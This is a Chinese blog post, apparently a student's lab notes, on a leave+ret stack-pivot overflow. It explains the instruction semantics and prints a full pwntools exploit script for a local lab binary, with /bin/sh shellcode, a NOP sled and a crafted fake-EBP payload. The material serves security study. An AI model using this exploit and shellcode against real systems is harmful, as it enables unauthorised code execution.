---
title: leave + ret 栈溢出
date: 2024-04-08
categories: [UCAS_LESSION]
tags: [stackoverfolw,adv_vulun,pwn]     # TAG names should always be lowercase
---

# 0x01 why record
今天实验课上做了leave+ret栈溢出，课上没有做出来，课下想明白了，特此记录一下

# 0x02 原理分析
leave指令等将于这两条指令：
    mov esp, ebp
    pop ebp
即为
    esp = ebp + 4
    ebp = [ebp]
这里一直没想明白 因为没想到pop回导致esp+4(32位)

想明白这个就很容易了 esp = ebp + 4 => esp 指向了ret_addr的位置  
如果这里修改esp为shellcode的地址， 溢出就完成了

# 0x03 exp分析
```python
#!/usr/bin/env python
#coding=utf-8

from pwn import *
import sys
context.arch='i386'
context.log_level='debug'
context.terminal = ['tmux', 'split', '-h']

def sendPayload(p,payload,hFile):
    hFile.write(payload)
    hFile.flush()
    p.send(payload)

shellcode = bytes.fromhex('6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a3b5883e830cd8090')

def pwn01():
    fPayload=open("poc_ebp.txt","wb")
    p=process('./ebp_bin')
    p.settimeout(0.01)
    #gdb.attach(p)
    data_str1 = b'\x90\x90\x90\x90'+p32(0x80ECA08) + shellcode
    data_str = data_str1 + (0x117-len(data_str1))*b'A' + p32(0x80ECA00)+b'\n'
    sendPayload(p, data_str, fPayload)
    fPayload.close()
    p.interactive()

if __name__ == '__main__':
    pwn01()
```

重点是这里：
```python
data_str1 = b'\x90\x90\x90\x90'+p32(0x80ECA08) + shellcode
data_str = data_str1 + (0x117-len(data_str1))*b'A' + p32(0x80ECA00)+b'\n'
```
p32(0x80ECA00)用来覆盖ebp。因为leave指令，需要保证覆盖地址有效，且该地址+4是一个有效的返回地址。


即0x80ECA04为有效的地址，[0x80ECA04] = 0x80ECA08 正好是 shellcode的起始地址
原理不难 动态调一遍就行啦
![picture 0](/images/dae4ce81c69cbb0f35adeb14f211d5f50405d85bd966f5ea90164f38e06dbbe2.png)  

# 0x04 结束
时间不早了 洗洗睡了
